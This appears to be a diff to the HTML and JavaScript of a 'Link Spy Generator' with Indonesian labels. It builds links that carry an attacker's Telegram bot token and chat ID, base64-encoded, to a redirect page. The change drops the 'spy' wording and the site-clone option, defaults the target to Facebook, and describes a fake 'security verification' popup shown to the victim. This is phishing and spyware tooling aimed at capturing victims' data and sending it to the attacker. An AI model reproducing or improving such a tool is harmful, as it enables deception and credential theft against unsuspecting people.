@@ -106,15 +106,16 @@
             padding: 10px;
             background: rgba(255, 255, 255, 0.1);
             border-radius: 5px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔗 Link Spy Generator</h1>
+        <h1>🔗 Generator Link</h1>
         
         <div class="form-group">
-            <label>Bot Token:</label>
+            <label>Bot Token Telegram:</label>
             <input type="text" id="botToken" placeholder="Masukkan token bot Telegram">
         </div>
         
@@ -124,28 +125,23 @@
         </div>
         
         <div class="form-group">
-            <label>URL Target (Website Asli):</label>
-            <input type="text" id="targetUrl" placeholder="Contoh: https://google.com" value="https://google.com">
+            <label>URL Website Asli:</label>
+            <input type="text" id="targetUrl" placeholder="Contoh: https://facebook.com" value="https://facebook.com">
         </div>
         
-        <div class="form-group">
-            <label>Nama Website (Untuk Clone):</label>
-            <input type="text" id="siteName" placeholder="Contoh: Google" value="Google">
-        </div>
-        
-        <button class="btn" id="generateBtn">Generate Link Spy</button>
+        <button class="btn" id="generateBtn">Generate Link</button>
         
         <div class="result" id="result">
-            <h3>Link Spy Berhasil Dibuat:</h3>
+            <h3>Link Berhasil Dibuat:</h3>
             <div class="generated-link" id="generatedLink"></div>
             
             <div class="preview">
                 <strong>Preview:</strong><br>
-                Target akan melihat clone website <span id="previewSiteName">Google</span><br>
-                Lalu redirect ke: <span id="previewTargetUrl">https://google.com</span>
+                Target akan langsung dibuka ke: <span id="previewTargetUrl">https://facebook.com</span><br>
+                Dan muncul popup verifikasi keamanan
             </div>
             
-            <button class="copy-btn" id="copyBtn">Salin Link Spy</button>
+            <button class="copy-btn" id="copyBtn">Salin Link</button>
         </div>
         
         <button class="btn" style="background: #6c757d;" id="keluarBtn">Keluar</button>
@@ -156,7 +152,6 @@
             const botToken = document.getElementById('botToken').value;
             const chatId = document.getElementById('chatId').value;
             const targetUrl = document.getElementById('targetUrl').value;
-            const siteName = document.getElementById('siteName').value;
             
             if (!botToken || !chatId || !targetUrl) {
                 alert('Isi semua field terlebih dahulu!');
@@ -167,20 +162,18 @@
             const data = {
                 token: botToken,
                 chatId: chatId,
-                target: targetUrl,
-                siteName: siteName
+                target: targetUrl
             };
             
             const encodedData = btoa(JSON.stringify(data));
             
-            // Generate link spy
+            // Generate link - langsung ke website asli dengan popup
             const currentUrl = window.location.href;
             const baseUrl = currentUrl.substring(0, currentUrl.lastIndexOf('/') + 1);
-            const spyUrl = baseUrl + 'spy.html?data=' + encodedData;
+            const spyUrl = baseUrl + 'redirect.html?data=' + encodedData;
             
             // Tampilkan hasil
             document.getElementById('generatedLink').textContent = spyUrl;
-            document.getElementById('previewSiteName').textContent = siteName;
             document.getElementById('previewTargetUrl').textContent = targetUrl;
             document.getElementById('result').style.display = 'block';
         });
@@ -188,7 +181,7 @@
         document.getElementById('copyBtn').addEventListener('click', function() {
             const linkText = document.getElementById('generatedLink').textContent;
             navigator.clipboard.writeText(linkText).then(() => {
-                alert('Link spy berhasil disalin!');
+                alert('Link berhasil disalin!');
             });
         });
         
